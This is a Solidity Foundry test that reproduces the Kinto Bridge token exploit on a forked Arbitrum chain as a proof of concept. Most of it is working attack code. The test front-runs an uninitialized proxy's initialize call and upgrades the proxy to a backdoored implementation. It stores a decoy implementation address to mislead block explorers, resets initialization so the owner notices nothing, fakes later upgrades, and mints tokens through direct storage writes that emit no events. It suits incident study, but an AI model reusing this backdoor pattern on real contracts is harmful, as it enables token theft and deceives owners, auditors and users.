// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

//forge install OpenZeppelin/openzeppelin-contracts-upgradeable
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20PermitUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/AccessControlUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Votes.sol";

// Kinto Bridge incident PoC
/*
Incident Scenario
    1. Deployer deploys BridgedToken implementation and EIP1967Proxy contract (forgot initialization) (Block number: 317434592)
    2. Attacker calls initialize first to set themselves as admin (https://arbiscan.io/tx/0xd17330df683adeec26a67ff6972a74ab60a1e5577c73d0e074d8e890fab5279c)
    3. Attacker calls upgradeTo to upgrade to their backdoor contract
        3-1. Store existing implementation in OpenZeppelin slot (to deceive Arbiscan), manipulate initialize slot
        3-2. Attacker secretly adds function to control balance in backdoor contract (function to control total supply and individual wallet balance)
    4. kintoAdmin unknowingly calls initialize and operates service normally, unaware of the backdoor insertion
    5. kintoAdmin attempts to change the token contract implementation, but only the OpenZeppelin slot changes, not the actual implementation
    6. Attacker calls balance manipulation function instead of mint function
*/

contract KintoBridgeTest is Test {
    // Define user addresses

    address public kintoAdmin;
    address public attacker;
    address public kintoProxy = 0x010700AB046Dd8e92b0e3587842080Df36364ed3;
    address public kintoTokenImplementation =
        0x1A16bcDDD1bf92049E2a44E136081061EEAcE7C0;
    uint256 BLOCKNUMBER_KintoProxyDeploy = 317434592;

    function setUp() public {
        kintoAdmin = makeAddr("KintoAdmin");
        attacker = makeAddr("Attacker");
    }

    function testExploit() public {
        //--------------------- 1. Deployer deploys BridgedToken implementation and EIP1967Proxy contract (fork to that block)
        vm.createSelectFork("arbitrum", BLOCKNUMBER_KintoProxyDeploy + 1);

        // Mistake: using empty data instead of proper initialization data
        ERC1967Proxy proxyInstance = ERC1967Proxy(payable(kintoProxy));

        //--------------------- 2. Attacker calls initialize first to add themselves as admin
        vm.startPrank(attacker);

        // Call initialize on implementation
        BridgedToken(address(proxyInstance)).initialize(
            "",
            "",
            attacker, // attacker sets themselves as admin
            attacker, // minter is also attacker
            attacker // upgrader is also attacker
        );

        //--------------------- 3. Attacker calls upgradeTo to upgrade to their backdoor contract
        //                         3-1. Store existing implementation in OpenZeppelin slot (to deceive Arbiscan), manipulate initialize slot
        //                         3-2. Attacker secretly adds function to control balance in backdoor contract (function to control total supply and individual wallet balance)

        {
            // Check slot state before backdoor insertion
            bytes32 eip1967Slot = vm.load(
                address(proxyInstance),
                0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
            );
            bytes32 ozSlot = vm.load(
                address(proxyInstance),
                0x7050c9e0f4ca769c69bd3a8ef740bc37934f8e2c036e5a723fd8ee048ed3f8c3
            );
            console.log("========================================");
            console.log(
                "Before EIP1967 Slot (actual):",
                address(uint160(uint256(eip1967Slot)))
            );
            console.log(
                "Before OpenZeppelin Slot (fake):",
                address(uint160(uint256(ozSlot)))
            );
            console.log("---");
        }
        AttackerBridgedToken attackerTokenImplementation = new AttackerBridgedToken(
                18
            );
        BridgedToken(address(proxyInstance)).upgradeToAndCall(
            address(attackerTokenImplementation),
            abi.encodeWithSignature(
                "resetInitializedAndSetImplementationToOZSlot(address)",
                kintoTokenImplementation
            ) // Insert existing implementation address into OZ slot
        );

        {
            // Check slot state after backdoor insertion
            bytes32 eip1967Slot = vm.load(
                address(proxyInstance),
                0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
            );
            bytes32 ozSlot = vm.load(
                address(proxyInstance),
                0x7050c9e0f4ca769c69bd3a8ef740bc37934f8e2c036e5a723fd8ee048ed3f8c3
            );
            console.log(
                "After EIP1967 Slot (actual):",
                address(uint160(uint256(eip1967Slot)))
            );
            console.log(
                "After OpenZeppelin Slot (fake):",
                address(uint160(uint256(ozSlot)))
            );
            console.log("---");
            console.log(
                "Attacker's Implementation Address:",
                address(attackerTokenImplementation)
            );
            console.log(
                "kintoTokenImplementation Address:",
                kintoTokenImplementation
            );
        }

        vm.stopPrank();

        //--------------------- 4. kintoAdmin unknowingly calls initialize and operates service normally, unaware of the backdoor insertion
        vm.startPrank(kintoAdmin);

        BridgedToken(address(proxyInstance)).initialize(
            "Kinto",
            "K",
            kintoAdmin,
            kintoAdmin,
            kintoAdmin
        );
        vm.stopPrank();

        //--------------------- 5. kintoAdmin attempts to change the token contract implementation, but only the OpenZeppelin slot changes, not the actual implementation
        vm.startPrank(kintoAdmin);
        address newKintoTokenImplementation = 0x96b7f2fa54a306BaC6fDE57f47f932a681dD9deF;
        BridgedToken(address(proxyInstance)).upgradeToAndCall(
            newKintoTokenImplementation,
            ""
        );
        vm.stopPrank();

        //--------------------- 6. Attacker calls balance manipulation function instead of mint function
        vm.startPrank(attacker);
        console.log("========================================");
        console.log(
            "KintoToken total supply before minting:",
            ERC20(address(proxyInstance)).totalSupply()
        );
        console.log(
            "Attacker's address before minting:",
            ERC20(address(proxyInstance)).balanceOf(attacker)
        );

        // Start event recording - check if setBalance call doesn't generate Transfer event
        vm.recordLogs();

        bytes32 erc20StorageSlot = 0x52c63247e1f47db19d5ce0460030c497f067ca4cebf71ba98eeadabe20bace00;
        bytes32 balanceSlot = keccak256(abi.encode(attacker, erc20StorageSlot));
        AttackerBridgedToken(address(proxyInstance)).setBalance(
            balanceSlot,
            1000 * 10 ** 18
        );

        // Get recorded events
        Vm.Log[] memory logs = vm.getRecordedLogs();

        // Check if Transfer event was not generated
        bytes32 transferEventSignature = keccak256(
            "Transfer(address,address,uint256)"
        );
        // setBalance() directly manipulates storage so it should not generate Transfer event
        require(
            logs.length == 0,
            "Transfer event should NOT be emitted by setBalance()"
        );

        console.log(
            "KintoToken total supply after minting:",
            ERC20(address(proxyInstance)).totalSupply()
        );
        console.log(
            "Attacker's address after minting:",
            ERC20(address(proxyInstance)).balanceOf(attacker)
        );

        console.log("========================================");
        console.log("Comparing with legitimate mint() function:");

        // Check if normal mint() function generates Transfer event
        vm.recordLogs();

        // kintoAdmin calls normal mint function
        vm.startPrank(kintoAdmin);
        BridgedToken(address(proxyInstance)).mint(kintoAdmin, 100 * 10 ** 18);
        vm.stopPrank();

        // Get recorded events
        Vm.Log[] memory mintLogs = vm.getRecordedLogs();

        // Check if Transfer event was generated
        bool mintTransferEventFound = false;
        for (uint i = 0; i < mintLogs.length; i++) {
            if (mintLogs[i].topics[0] == transferEventSignature) {
                mintTransferEventFound = true;
                break;
            }
        }

        // Normal mint() should generate Transfer event
        require(
            mintTransferEventFound,
            "Transfer event should be emitted by mint()"
        );
        console.log(
            "mint() correctly emitted Transfer event (legitimate operation)"
        );
        console.log(
            "KintoToken total supply after minting:",
            ERC20(address(proxyInstance)).totalSupply()
        );
        console.log(
            "Attacker's address after minting:",
            ERC20(address(proxyInstance)).balanceOf(attacker)
        );
    }
}

// Kinto's publicly disclosed token contract source
contract BridgedToken is
    Initializable,
    ERC20Upgradeable,
    ERC20PermitUpgradeable,
    AccessControlUpgradeable,
    UUPSUpgradeable
{
    uint8 private immutable _decimals;

    /// @notice Role that can mint and burn tokens as part of bridging.
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

    /// @notice Role that can upgrade the implementation of the proxy.
    bytes32 public constant UPGRADER_ROLE = keccak256("UPGRADER_ROLE");

    /// @notice Thrown when input array lengths don't match in batch operations
    error ArrayLengthMismatch();
    /// @notice Thrown when empty arrays are provided to batch operations
    error EmptyArrays();

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor(uint8 decimals_) {
        _disableInitializers();
        _decimals = decimals_;
    }

    /**
     * @notice Creates a new token with bridging capabilities.
     * @param name The token's name.
     * @param symbol The token's symbol.
     * @param admin The initial admin, typically the deployer or a governance entity, with rights to manage roles.
     * @param minter The initial minter address, granted MINTER_ROLE for minting and burning tokens.
     * @dev Uses role-based access control for role assignments. Grants the deploying address the default admin
     * role for role management and assigns the MINTER_ROLE to a specified minter.
     */
    function initialize(
        string memory name,
        string memory symbol,
        address admin,
        address minter,
        address upgrader
    ) public virtual initializer {
        __ERC20_init(name, symbol);
        __ERC20Permit_init(name);
        __AccessControl_init();
        __UUPSUpgradeable_init();

        _grantRole(DEFAULT_ADMIN_ROLE, admin);
        _grantRole(MINTER_ROLE, minter);
        _grantRole(UPGRADER_ROLE, upgrader);
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    /**
     * @dev Authorizes the contract upgrade.
     * Called by the proxy to ensure the caller has `UPGRADER_ROLE` before upgrading.
     *
     * @param newImplementation Address of the new contract implementation.
     */
    function _authorizeUpgrade(
        address newImplementation
    ) internal override onlyRole(UPGRADER_ROLE) {}

    /**
     * @notice Mints tokens to `to`, increasing the total supply.
     * @param to The recipient of the minted tokens.
     * @param amount The quantity of tokens to mint.
     * @dev Requires MINTER_ROLE. Can be used by authorized entities for new tokens in bridge operations.
     */
    function mint(address to, uint256 amount) public onlyRole(MINTER_ROLE) {
        _mint(to, amount);
    }

    /**
     * @notice Burns tokens from `from`, reducing the total supply.
     * @param from The address whose tokens will be burned.
     * @param amount The quantity of tokens to burn.
     * @dev Requires MINTER_ROLE. Can be used by authorized entities to remove tokens in bridge operations.
     */
    function burn(address from, uint256 amount) public onlyRole(MINTER_ROLE) {
        _burn(from, amount);
    }

    /**
     * @notice Mints tokens to multiple addresses in a single transaction.
     * @param recipients Array of addresses to receive the minted tokens.
     * @param amounts Array of token amounts to mint to each recipient.
     * @dev Requires MINTER_ROLE. Reverts if array lengths don't match or if arrays are empty.
     * Can be used for batch bridging operations to optimize gas costs.
     */
    function batchMint(
        address[] calldata recipients,
        uint256[] calldata amounts
    ) public onlyRole(MINTER_ROLE) {
        if (recipients.length != amounts.length) revert ArrayLengthMismatch();
        if (recipients.length == 0) revert EmptyArrays();

        for (uint256 i = 0; i < recipients.length; i++) {
            _mint(recipients[i], amounts[i]);
        }
    }

    /**
     * @notice Burns tokens from multiple addresses in a single transaction.
     * @param from Array of addresses to burn tokens from.
     * @param amounts Array of token amounts to burn from each address.
     * @dev Requires MINTER_ROLE. Reverts if array lengths don't match or if arrays are empty.
     * Can be used for batch bridging operations to optimize gas costs.
     */
    function batchBurn(
        address[] calldata from,
        uint256[] calldata amounts
    ) public onlyRole(MINTER_ROLE) {
        if (from.length != amounts.length) revert ArrayLengthMismatch();
        if (from.length == 0) revert EmptyArrays();

        for (uint256 i = 0; i < from.length; i++) {
            _burn(from[i], amounts[i]);
        }
    }
}

/**
 * @title AttackerBridgedToken
 *
 * Note: Modified by inheriting Kinto's token contract.
 * Added balance slot manipulation function and initialize slot manipulation function.
 * Manipulated so OZ slot is updated even when initialize is called later.
 */
contract AttackerBridgedToken is BridgedToken {
    constructor(uint8 decimals_) BridgedToken(decimals_) {}

    // Directly access Initializable storage to change state
    function resetInitialized() internal onlyRole(DEFAULT_ADMIN_ROLE) {
        InitializableStorage storage $;

        bytes32 slot = _initializableStorageSlot();
        assembly {
            $.slot := slot
        }

        $._initialized = 0; // Reset to uninitialized state
    }

    // Initialize Initializable storage slot and store existing implementation address in OpenZeppelin slot
    function resetInitializedAndSetImplementationToOZSlot(
        address previousImplementation
    ) external onlyRole(DEFAULT_ADMIN_ROLE) {
        // Store newImplementation in OpenZeppelin slot ( keccak256("org.zeppelinos.proxy.implementation") )
        // To deceive implementation on Etherscan
        bytes32 openZeppelinImplementation = 0x7050c9e0f4ca769c69bd3a8ef740bc37934f8e2c036e5a723fd8ee048ed3f8c3;
        assembly {
            sstore(openZeppelinImplementation, previousImplementation)
        }

        resetInitialized();
    }

    // keccak256(abi.encode(uint256(keccak256("openzeppelin.storage.ERC20")) - 1)) & ~bytes32(uint256(0xff))
    bytes32 private constant ERC20StorageLocation =
        0x52c63247e1f47db19d5ce0460030c497f067ca4cebf71ba98eeadabe20bace00;

    function _getCustomERC20Storage()
        private
        pure
        returns (ERC20Storage storage $)
    {
        assembly {
            $.slot := ERC20StorageLocation
        }
    }

    // // 직접적으로 balanceOf를 조작하는 함수
    function setBalance(
        bytes32 balanceSlot,
        uint256 value
    ) external onlyRole(DEFAULT_ADMIN_ROLE) {
        // ERC20 스토리지 베이스 슬롯
        bytes32 erc20StorageSlot = 0x52c63247e1f47db19d5ce0460030c497f067ca4cebf71ba98eeadabe20bace00;

        // totalSupply 슬롯 (베이스 슬롯 + 2)
        bytes32 totalSupplySlot = bytes32(uint256(erc20StorageSlot) + 2);

        // 직접 슬롯에 값 저장
        assembly {
            sstore(balanceSlot, value)
            let currentSupply := sload(totalSupplySlot)
            sstore(totalSupplySlot, add(currentSupply, value))
        }
    }
    // Upgrade event declaration (same as ERC1967Proxy)
    event Upgraded(address indexed implementation);

    // Malicious upgradeToAndCall function - changes only OZ slot value to deceive that implementation has changed
    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) public payable override {
        // Store newImplementation in OpenZeppelin slot ( keccak256("org.zeppelinos.proxy.implementation") )
        // To deceive implementation on Etherscan
        bytes32 openZeppelinImplementation = 0x7050c9e0f4ca769c69bd3a8ef740bc37934f8e2c036e5a723fd8ee048ed3f8c3;
        assembly {
            sstore(openZeppelinImplementation, newImplementation)
        }
        emit Upgraded(newImplementation);

        // EIP-1967 Implementation slot address (actual slot used by proxy)
        bytes32 backdoorSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        // Read actual implementation address from slot
        address actualImplementation;
        assembly {
            actualImplementation := sload(backdoorSlot)
        }

        // delegatecall to actual slot address (ignore newImplementation)
        if (data.length > 0) {
            (bool success, bytes memory returndata) = actualImplementation
                .delegatecall(data);
        }
    }
}
